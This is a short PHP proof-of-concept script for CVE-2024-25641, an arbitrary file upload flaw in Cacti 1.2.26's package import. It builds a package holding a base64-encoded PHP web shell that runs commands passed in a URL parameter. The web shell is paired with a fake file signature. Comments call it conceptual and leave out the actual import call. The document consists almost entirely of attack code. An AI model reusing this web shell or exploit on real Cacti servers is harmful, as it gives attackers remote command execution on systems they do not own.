
&lt;?php
// PoC for CVE-2024-25641 arbitrary PHP file upload via import_package function in Cacti 1.2.26
// This PoC assumes you have access to run PHP script within Cacti environment and can call import_package

function create_malicious_package() {
    $php_code = "&lt;?php system($_GET['cmd']); ?&gt;";
    $encoded_php = base64_encode($php_code);
    $package = array(
        "files" =&gt; array(
            "file" =&gt; array(
                array(
                    "name" =&gt; "scripts/malicious.php",
                    "data" =&gt; $encoded_php,
                    "filesignature" =&gt; base64_encode("fake_signature")
                )
            )
        )
    );
    return $package;
}

// Here you would call import_package with the crafted package containing arbitrary PHP.
// This is a conceptual PoC showing arbitrary PHP upload is possible.
$package = create_malicious_package();
var_dump($package);
?&gt;
